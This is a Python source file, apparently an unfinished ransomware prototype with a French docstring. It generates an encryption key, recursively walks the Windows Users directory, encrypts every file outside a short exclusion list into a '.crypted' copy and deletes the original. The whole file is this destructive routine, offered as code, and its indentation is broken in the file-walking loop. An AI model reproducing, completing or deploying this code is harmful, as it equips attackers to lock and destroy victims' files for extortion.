#!/usr/bin/python
#coding:utf-8
import os
from cryptography.fernet import Fernet

letter = os.environ["SystemDrive"]
user = os.environ["Username"]

class exploreThenCrypt():
    '''
        Ici le commentaire de la fonction de la classe
    '''
    def __init__(self):
        self.key = Fernet.generate_key()
        self.keyname = os.environ["USERNAME"]

    #Key generator
    def keyCreation(self, keyname):
        #Write it down somewhere on a file
        with open(f"{keyname}.key", 'wb') as filekey:
            filekey.write(self.key)

    #Storing and reading the key
    def useTheKey(self, key, name):
        with open(name, 'rb') as file:
            crypting = file.read()

        #Using the key to crypt
        fernet = Fernet(key)
        encrypted = fernet.encrypt(crypting)
        encrypted_file = name + ".crypted"
        try:
            with open(encrypted_file, 'wb') as files:
                files.write(encrypted)
            os.remove(name)
        except:
            pass

    #Explore then crypt everything from users dir
    def exploreAll(self):
        target = ["\\Users\\"]
        #Crypting all folders and files from the target
        for x in target:
            for root, dirs, files in os.walk(x):
                for file in files:
                    my_files = ["main.exe" ]
                        if not(file in my_files):
                            for ext in file.split("."):
                                if(file.endswith(ext)):
                                    my_ext = ["py", "pyc", "key", "dll", "pyd", "crypted"]
                                    if not(ext in my_ext):
                                        try:
                                            dir = os.path.join(root, file)
                                            self.useTheKey(self.key, dir)
                                        except:
                                            pass
